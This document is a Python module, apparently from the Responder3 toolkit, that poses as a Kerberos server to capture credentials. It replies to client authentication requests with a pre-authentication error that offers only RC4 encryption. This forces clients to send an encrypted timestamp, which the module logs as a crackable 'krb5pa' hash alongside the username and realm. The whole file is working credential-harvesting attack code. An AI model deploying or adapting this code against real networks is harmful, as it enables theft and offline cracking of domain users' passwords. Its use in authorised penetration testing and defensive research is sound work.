
# Module to grab Kerberosv5 krb5pa "hashes" (encrypted timestamp)

import logging
import asyncio


from responder3.core.commons import *
from responder3.protocols.KerberosV5 import *
from responder3.core.servertemplate import ResponderServer, ResponderServerSession

class KERBEROSSession(ResponderServerSession):
	def __init__(self, connection, log_queue):
		ResponderServerSession.__init__(self, connection, log_queue, self.__class__.__name__)

	def __repr__(self):
		t  = '== KerberosSession ==\r\n'
		return t


class KERBEROS(ResponderServer):
	def init(self):
		self.parser = KerberosParser
		self.parse_settings()
		
	def parse_settings(self):
		pass

	async def parse_message(self, timeout=None):
		try:
			req = await asyncio.wait_for(self.parser.from_streamreader(self.creader), timeout=timeout)
			return req
		except asyncio.TimeoutError:
			await self.log('Timeout!', logging.DEBUG)
			
			
	async def request_preauth(self, realm):
		"""
		Sending back kerberos error message to force client to yeild the encripted timestamp.
		We are sending RC4 cipher as the only encryption type, you may want to extend it to your needs
		Be careful, for AES enctype you'd need to send additional data (salt) as well!
		
		TODO: e-data field needs to be extended to match windows specs
		"""
		
		#contructing error message
		now = datetime.datetime.utcnow()
		
		ed = ETYPE_INFO2([ETYPE_INFO2_ENTRY({'etype' : EncryptionType.ARCFOUR_HMAC_MD5.value})])
		pa = PA_DATA({'padata-type': PaDataType.ETYPE_INFO2.value, 'padata-value': ed.dump()})
		
		t = {}
		t['pvno'] = krb5_pvno
		t['msg-type'] = MESSAGE_TYPE.KRB_ERROR.value
		t['error-code'] = 25 #enum is missiong for this
		t['stime'] = now
		t['susec'] = now.microsecond
		t['realm'] = realm
		t['sname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': ['krbtgt', realm]})
		t['e-data'] = METHOD_DATA([pa]).dump()
		
		error = KRB_ERROR(t).dump()
		
		#extending error message bytes with length field
		data = len(error).to_bytes(4, byteorder = 'big', signed = False)
		
		#sending error message
		self.cwriter.write(data + error)
		await self.cwriter.drain()
		
		

	async def run(self):
		try:
			while True:
				msg = await asyncio.wait_for(self.parse_message(), timeout = 1)
				asreq = msg.native
				realm = asreq['req-body']['realm']
				cname = asreq['req-body']['cname']['name-string'][0]
				for padata in asreq['padata']:
					if padata['padata-type'] == int(PADATA_TYPE('ENC-TIMESTAMP')):
						edata = EncryptedData.load(padata['padata-value']).native
						etype = edata['etype']
						cipher = edata['cipher'].hex()
						
						fullhash = "$krb5pa$%s$%s$%s$dummy$%s" % (etype, cname, realm, cipher)
						cred = Credential('krb5pa',
								domain = realm,
								username= cname,
								fullhash=fullhash
							)
						await self.log_credential(cred)
						return
				
				#message did not contain authentication data, requesting padata
				await self.request_preauth(realm)
				return
				
					
		except Exception as e:
			await self.log_exception()
			pass
